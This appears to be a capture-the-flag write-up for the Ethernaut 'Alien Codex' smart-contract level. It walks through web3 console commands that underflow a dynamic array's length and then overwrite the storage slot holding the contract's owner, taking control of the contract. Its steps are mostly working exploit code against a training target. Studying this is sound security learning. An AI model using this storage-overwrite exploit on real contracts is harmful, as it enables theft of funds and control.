# Alien codex

Mission: take over owner of this contract but we no way to modify it directly because it now show how to assign value to `owner` that they inheit from Ownable.

check value of slot 0:
```javascript
await web3.eth.getStorageAt(contract.address,0)
> '0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
```

Try check owner:

```javascript
await contract.owner();
> '0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272'
```

To make change at revise function, we need to enable modifier contacted:
```javascript
await contract.make_contact();
```

Verify value in slot0 again and see that first byte change from 0x..0 to be 0x..1:
```javascript
await web3.eth.getStorageAt(contract.address,0)
> '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
```
It means slot 0 have both bool 1 byte and **owner** address.
![slot0](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Alien%20Codex/photo/slot0.JPG)

Check value of slot1:
```javascript
await web3.eth.getStorageAt(contract.address,1)
> '0x0000000000000000000000000000000000000000000000000000000000000000'
```

It no value at all, we try underflow attack by call function retract() to open all dynamic array:
```javascript
await contract.retract();
```

Verify value at slot1 again:
```javascript
await web3.eth.getStorageAt(contract.address,1)
> '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
```

from function revise(), we saw that it use codex[i],we may need to overflow slot from slot1 to slot0 
and find index of the owner that were in slot0, We want to replace value of `bytes32 _content` at the index of owner as player address.
Refer to maximum one slot hold 32 bytes mean 256 bit (1byte=8 bit)
_owner variable is located at slot 0 (address have 20 bytes), we need to change from 20bytes to 32bytes for `_content`.
See solution in [addr32bytes.js](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Alien%20Codex/addr32bytes.js)

Find index of owner, see solution in [callIndex.sol](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Alien%20Codex/callIndex.sol)

![index](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Alien%20Codex/photo/index.JPG)

Replace owner address as player address:
```javascript
await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000000176366cFD97885245fAEA72f8cB6951e52655Adf');
```

Verify that you are owner now:
```javascript
await contract.owner();
> '0x176366cFD97885245fAEA72f8cB6951e52655Adf'
```

![slot1](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Alien%20Codex/photo/slot1.JPG)

Level completed!
Difficulty 7/10

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of 2^256. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)